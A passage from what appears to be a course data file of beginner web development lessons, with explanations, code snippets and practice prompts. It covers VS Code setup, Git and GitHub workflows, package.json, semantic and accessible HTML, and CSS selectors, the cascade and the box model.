        code: `// Essential VS Code extensions for beginners:\n//\n// 1. ESLint       → catches errors as you type\n// 2. Prettier     → auto-formats your code\n// 3. GitLens      → shows git blame inline\n// 4. One Dark Pro → a popular dark theme\n// 5. Material Icon Theme → nice file icons\n//\n// How to install: Ctrl+Shift+X → search name → Install`,
      },
      {
        heading: 'Settings worth changing immediately',
        body: `VS Code works well out of the box, but a few settings make it much better. Set "Editor: Format on Save" to true — this makes Prettier format your code automatically every time you save. Set "Editor: Font Size" to 14 or 16 (the default 14 is fine for most, but bump it up if you strain). Set "Files: Auto Save" to "afterDelay" — this saves your file a moment after you stop typing, so you never lose work. Set "Editor: Word Wrap" to "on" — this wraps long lines so you do not have to scroll horizontally. These settings take two minutes to change and save you hours of frustration.`,
      },
      {
        heading: 'Opening your project the right way',
        body: `Never open individual files in VS Code. Always open the entire project folder. Use File → Open Folder (or drag the folder onto the VS Code icon). This gives VS Code the full context of your project — it sees all the files, the folder structure, and the configuration. The Explorer panel on the left shows your entire project tree. When you come back to a project after a week, opening the folder gives you everything at once. The next lesson assumes you have a project open in VS Code with the integrated terminal ready — you will use it to run your first Git commands.`,
      },
    ],
    aiPrompt: `I just installed VS Code. Walk me through the first 5 things I should do: change settings, install extensions, open a project folder, open the integrated terminal, and save my first file. Give me exact button names and keyboard shortcuts.`,
    terminalMission: `Open VS Code, press Ctrl+\` to open the integrated terminal, then run pwd and ls. You are now using the terminal from inside your editor — this is your new home. Then install the Prettier extension and turn on "Format on Save".`,
  },

  'm1-git-fundamentals': {
    pathId: 'full-stack-web',
    title: 'Git fundamentals — init, add, commit, log, branches',
    duration: '11 min',
    mekLabel: 'enough to save snapshots of your work and never lose progress again',
    sections: [
      {
        heading: 'Have you ever lost work? That is what Git prevents.',
        body: `Imagine working on a project for three hours, making a big change, and then realizing you broke everything. Without Git, your only option is to undo your changes by hand or start over. With Git, you type one command and go back to the last working snapshot. Git is a version control system — it takes photographs of your project at moments you choose. Every photograph is called a commit. You can travel back to any commit at any time. You can create alternate versions of your project to experiment safely. You can share your entire history with teammates. Git is the single most important tool in a developer's workflow.`,
        callout: `Git is not a backup tool. It is a time machine. Every commit is a save point you can return to. Backup saves copies. Git saves history — every version, every experiment, every mistake.`,
      },
      {
        heading: 'Setting up Git for the first time',
        body: `Before you can use Git, it needs to know who you are. This is because every commit is stamped with your name and email. Open your integrated terminal (remember, Ctrl+\` in VS Code from the last lesson) and run these two commands with your own name and email. You only need to do this once — Git remembers. After this, every commit you make will be labeled with your identity. This matters when you work with others or when you look back at your history and wonder "who wrote this terrible code?" (Spoiler: it was you, three months ago, at 2 AM.)`,
        code: `git config --global user.name "Your Name"\ngit config --global user.email "you@example.com"\n\n# Verify it worked:\ngit config --global --list\n# → user.name=Your Name\n# → user.email=you@example.com`,
      },
      {
        heading: 'The core cycle — init, add, commit',
        body: `Every Git project starts with git init. This creates a hidden .git folder that tracks everything. You only do this once per project. Once Git is initialized, you make changes to your files. When you reach a point worth saving — finishing a feature, fixing a bug, even just ending your session — you run git add . to stage all your changes, then git commit -m "a message describing what you did" to save the snapshot. The message is important. Six months from now, "fixed stuff" will mean nothing to you. "Added login form with email validation" tells you exactly what that commit contains.`,
        code: `# Step 1: Initialize Git in your project folder\ncd my-project\ngit init\n\n# Step 2: Make changes to your files\n# (create, edit, delete files)\n\n# Step 3: Stage your changes\ngit add .\n\n# Step 4: Commit with a clear message\ngit commit -m "Add login form with email validation"\n\n# The cycle: change → add → commit → repeat`,
      },
      {
        heading: 'Checking what is happening — status and log',
        body: `Two commands tell you everything about your Git state. git status shows which files have changed, which are staged, and which are untracked. Run it constantly — I run it every 30 seconds when I am working. It is a progress bar for your commit cycle. git log shows your full commit history. Each entry shows the commit ID (a long hash), the author, the date, and the message. If you ever need to go back to a previous state, you use that commit ID. You will use status every day. You will use log whenever something goes wrong and you need to find where.`,
        code: `git status   # "What is happening right now?"\n              # Shows changed, staged, untracked files\n\ngit log      # "What have I done so far?"\n              # Shows full commit history\n              # Press q to exit the log view\n\ngit log --oneline  # A shorter, cleaner view\n# abc1234 Add login form\n# def5678 Initial commit`,
      },
      {
        heading: 'Branches — experimenting without risk',
        body: `A branch is a separate copy of your project where you can experiment freely without affecting the main version. The default branch is called main. When you want to try something — a new feature, a risky refactor, a design change — you create a branch, do the work, and if it works, you merge it back into main. If it does not work, you delete the branch and main is untouched. Branches are cheap and fast in Git. They are how professional developers organize their work. When vibecoding, create a branch before every major AI experiment. If AI generates something broken, delete the branch and the mess disappears.`,
        code: `# Create and switch to a new branch:\ngit checkout -b experiment-new-feature\n\n# Make changes, commit as usual:\ngit add .\ngit commit -m "Try new layout"\n\n# Switch back to main:\ngit checkout main\n\n# Merge the experiment if it worked:\ngit merge experiment-new-feature\n\n# Delete the branch if it did not:\ngit branch -D experiment-new-feature`,
        callout: `Branches are the safety net for vibe coding. Before you paste AI code into your project, create a branch. If the AI code breaks everything, delete the branch. Your main branch stays clean. This alone is worth learning Git.`,
      },
    ],
    aiPrompt: `I have a project folder with an index.html file in it. Walk me through initializing Git, making my first commit with a good message, checking the status, viewing the log, creating a branch called "experiment", and switching back to main. Explain what each command does before I run it.`,
    terminalMission: `In your terminal: cd into any folder → git init → touch README.md → git add . → git commit -m "first commit" → git log --oneline. You just made your first commit.`,
  },

  'm1-github': {
    pathId: 'full-stack-web',
    title: 'GitHub — remotes, push/pull, PRs, README basics',
    duration: '10 min',
    mekLabel: 'enough to back up code, collaborate, and deploy from GitHub',
    sections: [
      {
        heading: 'Git vs GitHub — the engine and the garage',
        body: `Git is the tool that runs on your computer and tracks changes. GitHub is a website where you upload your Git repositories so they are backed up online, shareable, and deployable. Think of Git as the engine of a car and GitHub as the garage. The engine does the actual work. The garage stores the car, lets you show it to friends, and helps you work on it with other people. You can use Git perfectly well without GitHub. But GitHub adds backup, collaboration, and deployment — and it is free. Every developer has a GitHub profile. It is your portfolio, your backup drive, and your collaboration hub all in one.`,
        callout: `Git = version control on your computer. GitHub = your repos online, with collaboration and deployment built in. You need Git to use GitHub. You do not need GitHub to use Git. But in practice, every project ends up on GitHub.`,
      },
      {
        heading: 'Creating a repository on GitHub and connecting it',
        body: `You have done the work locally — you initialized Git, made commits, and have a working project. Now you want it backed up online. Go to github.com, sign in, click the "+" icon → "New repository", give it a name, and click create. Do not check "Initialize this repository with a README" since you already have files. GitHub then shows you commands to connect your local repo to the remote. Copy the "git remote add origin" line and run it in your terminal. This tells your local Git where the online version lives. Then run git push -u origin main to upload everything. From now on, git push sends your changes up. git pull downloads changes from GitHub.`,
        code: `# On GitHub: create a new repo (no README, no .gitignore)\n# GitHub shows you these commands:\n\ngit remote add origin https://github.com/you/your-repo.git\ngit branch -M main\ngit push -u origin main\n\n# After the first push, future updates are just:\ngit add .\ngit commit -m "describe your changes"\ngit push`,
      },
      {
        heading: 'The daily push/pull cycle',
        body: `Once connected, your workflow becomes simple. Start your session with git pull to get any changes from GitHub (important when collaborating). Do your work. Commit frequently with clear messages. End your session with git push to back everything up. Git pull at the start, git push at the end. That is the daily rhythm. If you only remember two Git commands, remember these. They keep your local and remote in sync. When you deploy to Vercel or Railway later, pushing to GitHub automatically triggers a deployment — so every push also ships your latest code to the internet.`,
      },
      {
        heading: 'Pull requests — proposing changes without breaking things',
        body: `A pull request (PR) is a proposal to merge changes from one branch into another. On GitHub, you create a branch locally, push it, then open a PR on the GitHub website asking to merge that branch into main. This lets you review changes before they go live. For solo projects, PRs are optional but good practice. For team projects, they are mandatory — every change gets reviewed before merging. Even when vibecoding alone, PRs are valuable because they force you to look at every change AI made before accepting it. If AI changed 15 files, the PR shows every diff, and you can reject specific changes.`,
        code: `# Full PR workflow:\ngit checkout -b add-dark-mode\n# ... make changes ...\ngit add .\ngit commit -m "Add dark mode toggle"\ngit push -u origin add-dark-mode\n\n# On GitHub: open a Pull Request from add-dark-mode → main\n# Review the changes, then click "Merge pull request"\n\n# Back on your computer:\ngit checkout main\ngit pull`,
      },
      {
        heading: 'The README — your project\'s front door',
        body: `A README.md file is the first thing people see when they visit your GitHub repo. It is written in Markdown — a simple way to format text with # for headings, **bold**, and \`code\`. A good README tells visitors what the project does, how to run it, what technologies it uses, and how to contribute. When you apply for jobs or share projects, the README is your project's resume. Every repo you create should have a README.md at the root. Even for small projects. Especially for vibe coding projects — the README proves you understand what AI built for you.`,
        code: `# Project Title\n\nA short description of what this project does.\n\n## Tech Stack\n- React + Vite\n- Node.js + Express\n- PostgreSQL\n\n## How to Run\n1. Clone the repo: git clone ...\n2. Install: npm install\n3. Start: npm run dev\n\n## What I Learned\n- How to connect frontend to backend\n- How to handle authentication\n- What AI gets right and wrong about routing`,
      },
    ],
    aiPrompt: `I have a local Git repository with one commit. Walk me through creating a GitHub repository, connecting my local repo to it, pushing my code, and writing a good README.md. Give me the exact commands to run.`,
    terminalMission: `Go to github.com, create a new repository (empty, no README). Then in your terminal: git remote add origin [your-repo-url] → git push -u origin main. Refresh the GitHub page — your code is now online.`,
  },

  'm1-project-structure': {
    pathId: 'full-stack-web',
    title: 'Project file structure & intro to npm/package.json',
    duration: '8 min',
    mekLabel: 'enough to navigate any AI-generated project without getting lost',
    sections: [
      {
        heading: 'How every web project is organized',
        body: `Every web project, whether built by you or by AI, follows a similar folder structure. There is a root folder (the project name), a source folder (usually called src or app) where your actual code lives, a configuration folder or file for your tools, and a package.json at the root that describes the entire project. When AI generates a project, it creates this structure automatically. If you understand the structure, you can navigate any AI-generated project immediately. If you do not, you open the folder and feel lost. This lesson makes sure you are never lost again.`,
        code: `my-project/           # Root folder (named after the project)\n├── src/              # Your source code goes here\n│   ├── index.html    # The main HTML file\n│   ├── style.css     # Styles\n│   └── app.js        # JavaScript\n├── package.json      # Project metadata and dependencies\n├── package-lock.json # Exact versions of every dependency\n├── .gitignore        # Files Git should ignore\n├── README.md         # Project description (from lesson 4)\n└── node_modules/     # Installed packages (auto-generated)`,
      },
      {
        heading: 'package.json — the identity card of your project',
        body: `package.json is a JSON file that tells the world everything about your project. It contains the project name, version, description, scripts you can run, and a list of dependencies (packages your project needs to work). When AI says "add this package", it means adding it to package.json. When you run npm install, Node reads package.json and downloads every package listed there into the node_modules folder. If you ever clone a project from GitHub, the first thing you do is run npm install to get all its dependencies. Without package.json, nobody knows what your project needs to run.`,
        code: `{\n  "name": "my-project",       // What the project is called\n  "version": "1.0.0",          // Current version\n  "description": "A cool app", // What it does\n  "scripts": {\n    "dev": "vite",             // npm run dev → starts dev server\n    "build": "vite build",     // npm run build → builds for production\n    "preview": "vite preview"  // npm run preview → preview the build\n  },\n  "dependencies": {\n    "react": "^18.2.0",        // Packages the app needs to run\n    "express": "^4.19.2"\n  },\n  "devDependencies": {\n    "vite": "^5.0.0"           // Packages only needed during development\n  }\n}`,
      },
      {
        heading: 'node_modules — do not touch this folder',
        body: `When you run npm install, Node creates a folder called node_modules and downloads every dependency into it. This folder is huge — often hundreds of megabytes, sometimes thousands of files. You should never, ever touch anything inside node_modules. You never edit it, commit it, or open it. It is automatically managed by npm. If something breaks in node_modules (which happens), delete the entire folder and run npm install again. That fixes almost all "weird dependency" errors. The node_modules folder is also the first thing you add to .gitignore because uploading it to GitHub would be insane — it is enormous and regenerates from package.json anyway.`,
        callout: `node_modules is the one folder you never touch, never open, and never commit to Git. If it breaks, delete it and run npm install. That fixes 90% of "help my project stopped working" problems.`,
      },
      {
        heading: 'npm scripts — the commands you will run every day',
        body: `The "scripts" section in package.json defines shortcuts for common commands. Instead of typing a long command, you type npm run [script-name]. The most common ones are npm run dev (starts a development server with hot reload), npm run build (builds the project for production), and npm run preview (previews the built version). When AI says "run the dev server", it means npm run dev. When it says "build for production", it means npm run build. These scripts are defined by the developer (or by AI) and can do anything. Look at the "scripts" section of any project's package.json to see what commands are available.`,
      },
      {
        heading: 'Tying it all together — your development environment',
        body: `Think about what you have built over these five lessons. You can navigate any folder with the terminal. You have VS Code configured with the terminal inside it. Your code is tracked by Git with branches for safe experimentation. It is backed up on GitHub with a README that explains it. Your project has a clear folder structure managed by npm. This is a complete development environment. Every professional developer — and every AI coding tool — expects this setup. When AI generates a project for you, these are the tools it assumes you have. You are no longer a beginner fumbling with the tools. You are someone who understands the workbench.`,
        callout: `The terminal, VS Code, Git, GitHub, and npm are not five separate things. They are one integrated environment. Every lesson in this module builds on the one before it. Master this stack, and you can work with any code — human-written or AI-generated.`,
      },
    ],
    aiPrompt: `I am starting a new project. Walk me through: creating the folder structure (src folder, index.html, package.json), running npm init to create the package.json, and explaining what each field in package.json means. Use a real example.`,
    terminalMission: `Create a new folder → cd into it → git init → npm init -y → open package.json in VS Code and read each field → create a src folder with an index.html inside → git add . → git commit -m "project scaffold". You have just set up a complete project from scratch.`,
  },

  // ═══════════════════════════════════════════════════════════════
  // Module 2: Front-End Fundamentals
  // ═══════════════════════════════════════════════════════════════

  'm2a-html-semantics': {
    pathId: 'full-stack-web',
    title: 'HTML — semantic structure, tags, forms, accessibility',
    duration: '15 min',
    mekLabel: 'enough to build a well-structured, accessible web page from scratch',
    sections: [
      {
        heading: 'What is HTML and why does it matter?',
        body: `HTML stands for HyperText Markup Language. That is a fancy way of saying "a language that uses tags to describe the structure of a web page." Think of a house. The HTML is the foundation, the walls, the roof, and the rooms. It decides what goes where. The CSS (which you learn next) is the paint, wallpaper, and furniture — it makes it look good. JavaScript is the electricity and plumbing — it makes things happen. Without HTML, there is no house. When you visit a website, your browser downloads the HTML and uses it to figure out what to show on screen. Every web page you have ever seen starts as HTML.`,
        callout: `HTML is not a programming language. It is a markup language. You do not write logic in it — you write structure. Think of it as a document with labels that tell the browser "this is a heading", "this is a paragraph", "this is an image". That is all HTML does.`,
      },
      {
        heading: 'Elements, tags, and attributes — the pieces of HTML',
        body: `Everything in HTML is built from elements. An element is a piece of content marked up by a tag. You write tags with angle brackets: <tagname>. Most elements have an opening tag and a closing tag: <p>This is a paragraph.</p>. The closing tag has a forward slash before the name. The content between the opening and closing tags is what the browser displays. Some elements are self-closing — they have no content and no closing tag. The <img> tag for images and <br> for line breaks are examples. Tags can also have attributes that provide extra information: <img src="photo.jpg" alt="A sunset">. The src attribute tells the browser where the image file is. The alt attribute provides text for screen readers (more on that later).`,
        code: `<p>This is a paragraph element — it has an opening tag, content, and a closing tag.</p>\n\n<!-- This is a heading element: -->\n<h1>This is a top-level heading</h1>\n\n<!-- A link with an attribute: -->\n<a href="https://example.com">Click here</a>\n\n<!-- A self-closing image with two attributes: -->\n<img src="cat.jpg" alt="A cute cat sleeping">`,
      },
      {
        heading: 'The skeleton — every HTML document needs this structure',
        body: `Every HTML page starts with the same basic structure. You should memorize this — you will type it dozens of times. The <!DOCTYPE html> declaration tells the browser "this is an HTML5 document." The <html> element wraps everything. Inside, you have <head> (metadata — things the user does not see) and <body> (the visible content). The <head> contains things like the page title (shows in the browser tab), character encoding (so letters and symbols display correctly), and links to CSS files. The <body> contains everything the user sees — headings, paragraphs, images, forms, and so on. When AI generates HTML for you, check that this skeleton is present. If it is missing, the page might still work, but it is not proper HTML.`,
        code: `<!DOCTYPE html>\n<html lang="en">\n<head>\n  <meta charset="UTF-8">\n  <meta name="viewport" content="width=device-width, initial-scale=1.0">\n  <title>My First Page</title>\n</head>\n<body>\n  <h1>Hello, World!</h1>\n  <p>This is my first web page.</p>\n</body>\n</html>`,
      },
      {
        heading: 'Semantic HTML — what does each tag actually mean?',
        body: `In the early days of the web, developers built pages entirely out of <div> tags. A <div> is a generic container — it means nothing. It is just a box. The problem with a page full of <div>s is that neither a human nor a machine can tell what each section is. Semantic HTML solves this by providing tags that describe their content. Instead of <div class="header">, you use <header>. Instead of <div class="nav">, you use <nav>. Instead of <div class="footer">, you use <footer>. The browser, search engines, and screen readers all understand these tags. A screen reader can jump directly to the <nav> to let a blind user skip to navigation. Google ranks pages higher when they use semantic HTML because Google can understand the page structure. Semantic HTML is not just good practice — it is the professional standard.`,
        code: `<!-- Non-semantic (bad) — everything is a div: -->\n<div class="header">My Site</div>\n<div class="nav"><a href="/">Home</a></div>\n<div class="main">\n  <div class="article">Article content here</div>\n  <div class="sidebar">Related links</div>\n</div>\n<div class="footer">Copyright 2025</div>\n\n<!-- Semantic (good) — tags describe the content: -->\n<header>My Site</header>\n<nav><a href="/">Home</a></nav>\n<main>\n  <article>Article content here</article>\n  <aside>Related links</aside>\n</main>\n<footer>Copyright 2025</footer>`,
        callout: `If you only remember one rule about HTML: use the tag that describes the content, not the tag that looks right. <header> for headers, <nav> for navigation, <main> for the main content, <article> for a self-contained piece of content, <section> for a group of related content, <aside> for tangential content, <footer> for footers. Everything else should be a <div> only if nothing else fits.`,
      },
      {
        heading: 'Forms — how users send data to your server',
        body: `A form is how a user sends data to you. Every time you log in, search, comment, or sign up, you are using a form. A form is built with the <form> element, which wraps input controls. The most common input controls are <input> (text, email, password, checkboxes, radio buttons, submit buttons), <textarea> (multi-line text), <select> (dropdown menus), and <button> (clickable buttons). Every form control should have a <label> element associated with it. The label tells users what the input is for. When a screen reader encounters an input, it reads the label out loud. The for attribute on the label connects it to the input's id. Without labels, your form is inaccessible — a blind user cannot fill it out. The action attribute on <form> tells the browser where to send the data. The method attribute tells it how (GET or POST). GET puts data in the URL (like search?q=hello). POST sends it in the request body (like login forms).`,
        code: `<form action="/signup" method="POST">\n  <div>\n    <label for="name">Full Name</label>\n    <input type="text" id="name" name="name" required>\n  </div>\n  <div>\n    <label for="email">Email Address</label>\n    <input type="email" id="email" name="email" required>\n  </div>\n  <div>\n    <label for="password">Password</label>\n    <input type="password" id="password" name="password" minlength="8">\n  </div>\n  <div>\n    <label for="country">Country</label>\n    <select id="country" name="country">\n      <option value="us">United States</option>\n      <option value="uk">United Kingdom</option>\n      <option value="ca">Canada</option>\n    </select>\n  </div>\n  <div>\n    <label>\n      <input type="checkbox" name="terms" required>\n      I agree to the terms\n    </label>\n  </div>\n  <button type="submit">Create Account</button>\n</form>`,
      },
      {
        heading: 'Accessibility — HTML for everyone',
        body: `Accessibility (often shortened to a11y — 11 letters between the a and the y) means making your website usable by people with disabilities. This is not optional. A blind person uses a screen reader that reads the page aloud. A person with motor impairments uses only the keyboard, not a mouse. A person with color blindness cannot distinguish certain colors. HTML has built-in features that handle all of these. Alt text on images is read aloud by screen readers — without it, a blind user just hears "image." Using semantic HTML means screen readers can navigate by landmarks. Labels on forms mean screen readers can tell users what to type. Using the right heading hierarchy (h1, then h2, then h3 — never skipping levels) lets screen reader users jump between sections. The required attribute on inputs tells the browser to validate before submitting. Making your HTML accessible from the start is much easier than fixing it later. And it makes your site better for everyone — captioning on videos helps people in loud environments, high contrast helps people in bright sunlight, keyboard navigation helps power users.`,
        callout: `Accessibility is not a feature you add later. It is how you write HTML from the start. Semantic tags + labels + alt text + proper heading hierarchy cover 80% of accessibility. If you do these four things, your page already works for most people with disabilities.`,
      },
      {
        heading: 'Putting it all together — a complete page',
        body: `Here is a complete HTML page that uses everything from this lesson. Read through it and notice: the semantic skeleton, the navigation, the article with a heading and paragraph, the aside with related links, the form with labels, and the footer. This is a real, functional HTML page. You could save this as index.html and open it in a browser right now. In the next lesson, you will learn how to make it look good with CSS.`,
        code: `<!DOCTYPE html>\n<html lang="en">\n<head>\n  <meta charset="UTF-8">\n  <meta name="viewport" content="width=device-width, initial-scale=1.0">\n  <title>Coffee Blog</title>\n</head>\n<body>\n  <header>\n    <h1>The Daily Grind</h1>\n    <nav>\n      <a href="/">Home</a>\n      <a href="/about">About</a>\n      <a href="/contact">Contact</a>\n    </nav>\n  </header>\n\n  <main>\n    <article>\n      <h2>How to Brew the Perfect Pour-Over</h2>\n      <p>Pour-over coffee gives you complete control over the brewing process. Start with 20g of freshly ground coffee and 320g of water at 200\u00b0F. Wet the filter first, add the coffee, bloom with 60g of water for 30 seconds, then pour in slow circles.</p>\n      <img src="pour-over.jpg" alt="A glass pour-over carafe on a wooden counter">\n    </article>\n\n    <aside>\n      <h3>Related Articles</h3>\n      <ul>\n        <li><a href="/espresso">Espresso at Home</a></li>\n        <li><a href="/cold-brew">Cold Brew Basics</a></li>\n      </ul>\n    </aside>\n\n    <section>\n      <h2>Subscribe to our newsletter</h2>\n      <form action="/subscribe" method="POST">\n        <label for="email">Email address</label>\n        <input type="email" id="email" name="email" required>\n        <button type="submit">Subscribe</button>\n      </form>\n    </section>\n  </main>\n\n  <footer>\n    <p>&copy; 2025 The Daily Grind. All rights reserved.</p>\n  </footer>\n</body>\n</html>`,
      },
    ],
    aiPrompt: `I want to build a personal portfolio page. Generate the complete HTML structure with semantic tags: a header with my name and navigation (Home, Projects, Contact), a main section with a hero heading, a section for my projects (at least 3 with titles and descriptions), a contact form with name, email, and message fields, and a footer. Use proper labels on form inputs and alt text on any images. Explain each semantic tag you use.`,
    terminalMission: `Create a file called "portfolio.html" and write a complete HTML page using semantic tags (<header>, <nav>, <main>, <section>, <article>, <footer>), a form with at least 3 inputs with labels, and an image with alt text. Open it in your browser to verify it works.`,
  },

  'm2b-css-box-model': {
    pathId: 'full-stack-web',
    title: 'CSS — box model, selectors, the cascade',
    duration: '16 min',
    mekLabel: 'enough to style any page with confidence and predictability',
    sections: [
      {
        heading: 'What is CSS and how does it connect to HTML?',
        body: `CSS stands for Cascading Style Sheets. It is the language that makes HTML look good. If HTML is the skeleton of a house, CSS is the paint, wallpaper, carpet, and furniture. It controls colors, sizes, spacing, fonts, and layouts. CSS works by selecting HTML elements and applying styles to them. The browser reads your CSS and figures out "for this <p> element, make the text blue, 16 pixels big, and add space below it." CSS lives in its own file (usually style.css) and is linked from the HTML <head> using a <link> tag. You can also write CSS inside a <style> tag in the HTML, or directly on an element using a style attribute — but separate CSS files are the professional way. One CSS file can style hundreds of HTML pages. That is the power of separation: change one file, update your entire website.`,
        code: `<!-- In your HTML <head>, link to your CSS file: -->\n<head>\n  <link rel="stylesheet" href="style.css">\n</head>\n\n/* In style.css — CSS does not look like HTML: */\np {\n  color: blue;\n  font-size: 16px;\n}\n\nh1 {\n  color: navy;\n  text-align: center;\n}`,
      },
      {
        heading: 'Selectors — how CSS finds the right elements',
        body: `A selector is a pattern that tells the browser which HTML elements to style. The simplest selector is the element selector — just write the tag name: p { ... } styles all paragraphs. A class selector targets elements with a specific class attribute. In HTML, you write class="highlight". In CSS, you write .highlight { ... } (note the dot). An ID selector targets an element with a specific id attribute. In HTML, you write id="main-heading". In CSS, you write #main-heading { ... } (note the hash). Classes can be reused on many elements. IDs must be unique — one ID per page. There are also descendant selectors (div p targets p elements inside a div), child selectors (div > p targets direct children), attribute selectors ([type="email"] targets inputs with type="email"), and pseudo-classes (:hover targets elements when the mouse is over them, :first-child targets the first child of a parent). You will use element, class, and pseudo-class selectors 90% of the time.`,
        code: `/* Element selector — targets ALL <p> tags: */\np {\n  font-size: 16px;\n}\n\n/* Class selector — targets ANY element with class="highlight": */\n.highlight {\n  background-color: yellow;\n}\n\n/* ID selector — targets the ONE element with id="logo": */\n#logo {\n  width: 100px;\n}\n\n/* Descendant selector — targets <a> inside <nav>: */\nnav a {\n  text-decoration: none;\n}\n\n/* Pseudo-class — targets <button> when hovered: */\nbutton:hover {\n  background-color: darkblue;\n  color: white;\n}\n\n/* Multiple selectors — applies same styles to all: */\nh1, h2, h3 {\n  font-family: Arial, sans-serif;\n}`,
      },
      {
        heading: 'The cascade — what happens when multiple rules conflict?',
        body: `The "Cascading" in Cascading Style Sheets refers to the system that decides which rule wins when two rules conflict. Suppose you have a paragraph. One rule says "make it blue" and another says "make it red". Which wins? The cascade decides based on three factors: specificity, source order, and importance. Specificity is the most important. An ID selector (#example) beats a class selector (.example) beats an element selector (p). In general, the more specific the selector, the more it overrides. If specificity is equal, the rule that appears later in the stylesheet wins. That is source order. Importancy (!important) is a special flag that overrides everything — but you should almost never use it. It is the nuclear option. If you find yourself using !important, it usually means your selectors are poorly structured. The practical rule: use the least specific selector that gets the job done. Start with element selectors, use classes when you need to differentiate, and only resort to IDs for truly unique elements.`,
        code: `/* Specificity ranking (lowest to highest):\n   1. Element selectors: p, h1, div\n   2. Class selectors: .highlight, .nav-link\n   3. ID selectors: #header, #logo\n   4. Inline styles: style="color: red"\n\n/* Example of cascade in action: */\np {\n  color: blue;           /* Element selector — low specificity */\n}\n\np.highlight {\n  color: green;          /* Element + class — higher specificity */\n}\n\n#special-paragraph {\n  color: red;            /* ID selector — highest specificity */\n}\n\n/* The paragraph with id="special-paragraph" will be red,\n   even though the other rules appear later in the file. */`,
        callout: `The cascade is the most confusing part of CSS for beginners. When a style does not apply the way you expected, the culprit is almost always specificity — a more specific selector is overriding your rule. Use your browser's DevTools (right-click → Inspect) to see exactly which CSS rules apply and which are crossed out.`,
      },
      {
        heading: 'The box model — every element is a rectangle',
        body: `Every single element on a web page is a rectangle. Even if it looks like a circle (because of border-radius), the browser still treats it as a rectangle. Inside that rectangle, there are four layers arranged from inside to outside. The content is the innermost layer — the text, image, or whatever the element contains. The padding is the space between the content and the border. It is inside the element — it pushes the border outward but does NOT push other elements away. The border is the line around the element (can be visible or invisible). The margin is the space outside the border. It pushes other elements away. Understanding these four layers is the single most important CSS concept. If your spacing looks wrong, it is almost always because you confused padding and margin. Remember: padding is inside the element (affects the element's background area), margin is outside the element (affects spacing between elements).`,
        code: `/* Visual model of a box (from inside to outside):\n   ┌ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ┐  ← margin (transparent)\n   │  ┌ ─ ─ ─ ─ ─ ─ ─ ─ ┐  │  ← border\n   │  │  ┌ ─ ─ ─ ─ ─ ┐  │  │  ← padding\n   │  │  │  content   │  │  │\n   │  │  └ ─ ─ ─ ─ ─ ┘  │  │\n   │  └ ─ ─ ─ ─ ─ ─ ─ ─ ┘  │\n   └ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ┘\n*/\n\n/* Applying the box model: */\n.box {\n  width: 300px;\n  height: 100px;\n  padding: 20px;        /* Space INSIDE the box */\n  border: 2px solid black; /* The edge of the box */\n  margin: 15px;         /* Space OUTSIDE the box */\n  background: lightblue; /* Fills content + padding area */\n}`,
      },
      {
        heading: 'box-sizing — the setting that saves your sanity',
        body: `There is a subtle trap in the box model. By default, the width and height you set apply only to the content area — not including padding and border. That means if you set width: 300px, padding: 20px, and border: 2px, the actual rendered width is 300 + 20 + 20 + 2 + 2 = 344 pixels. This makes layouts unpredictable. The fix is one line of CSS: box-sizing: border-box. This tells the browser "when I say width: 300px, I want the TOTAL width to be 300px — shrink the content area to make room for padding and border." Professional developers set this on every element at the top of their CSS file using the universal selector (*). Put this at the top of every CSS file you write. It will save you hours of confusion.`,
        code: `/* Put this at the TOP of every CSS file: */\n*, *::before, *::after {\n  box-sizing: border-box;\n}\n\n/* Now width means TOTAL width, including padding and border: */\n.box {\n  width: 300px;          /* Total width will be exactly 300px */\n  padding: 20px;         /* Content area shrinks to 260px */\n  border: 2px solid black; /* Content shrinks further to 256px */\n  margin: 15px;          /* Margin is OUTSIDE the total width */\n}`,
      },
      {
        heading: 'The display property — how elements behave',
        body: `Every HTML element has a default display behavior. A block element (like <p>, <h1>, <div>, <header>) takes up the full width of its container and starts on a new line. Stack them vertically — each one pushes the next one down. An inline element (like <a>, <span>, <strong>) sits next to other inline elements on the same line. It is as wide as its content, no more, no less. You cannot set width or height on inline elements. An inline-block element behaves like inline (sits on the same line) but accepts width and height like a block element. This is useful for buttons, cards in a row, and navigation items. The display: none property removes the element entirely — it is not visible and takes no space. The display: flex and display: grid properties create modern layouts (covered in the next lesson). Understanding display is the key to understanding why your elements are not where you expect them to be.`,
        code: `/* Block — takes full width, stacks vertically: */\np {\n  display: block;        /* This is the default for <p> */\n}\n\n/* Inline — sits on the same line, no width/height control: */\nspan {\n  display: inline;       /* This is the default for <span> */\n  width: 100px;          /* Ignored! Inline elements ignore width */\n}\n\n/* Inline-block — best of both worlds: */\n.button {\n  display: inline-block;\n  width: 150px;          /* Works! */\n  padding: 10px;\n}\n\n/* None — disappears completely: */\n.hidden {\n  display: none;         /* Element is not rendered at all */\n}`,
      },
      {
        heading: 'Units and colors — sizing and styling your elements',
        body: `CSS has many ways to specify sizes and colors. For sizes, px (pixels) is the most intuitive — one pixel equals one dot on the screen. But pixels are rigid. If a user zooms in, pixel sizes stay the same. rem is relative to the root font size (usually 16px). So 2rem = 32px. This is better for accessibility because it scales when the user changes their browser font size. em is relative to the parent element's font size — it gets tricky fast and beginners should stick to rem instead of em. % is relative to the parent element's size. vw is "viewport width" — 1vw is 1% of the browser window width. vh is "viewport height." For colors, named colors (red, blue, tomato) work but are limited. Hex codes (#ff0000 for red, #00ff00 for green, #0000ff for blue) are the most common way to specify colors. The format is #RRGGBB — two hex digits each for Red, Green, and Blue. rgb(255, 0, 0) does the same thing with decimal numbers. hsl(hue, saturation, lightness) is more intuitive once you understand it — hue is the color wheel (0-360), saturation is intensity (0-100%), lightness is brightness (0-100%). Use any of these. Hex is the most common.`,
        code: `/* Size units: */\n.box {\n  width: 300px;          /* Fixed size, always 300 pixels */\n  font-size: 1rem;       /* Relative to root font (usually 16px) */\n  padding: 1.5rem;       /* 1.5 * 16px = 24px */\n  margin-bottom: 2em;    /* Relative to THIS element's font size */\n  width: 50%;            /* Half of the parent element's width */\n  height: 100vh;         /* Full height of the browser window */\n}\n\n/* Color formats: */\n.text-red {\n  color: red;            /* Named color */\n  color: #ff0000;        /* Hex — most common format */\n  color: #f00;           /* Shorthand hex (same as #ff0000) */\n  color: rgb(255, 0, 0);  /* RGB decimal */\n  color: rgba(255, 0, 0, 0.5); /* RGB with opacity (semi-transparent) */\n  color: hsl(0, 100%, 50%); /* Hue, Saturation, Lightness */\n}`,
      },
      {
        heading: 'Putting it all together — styled page with exercises',
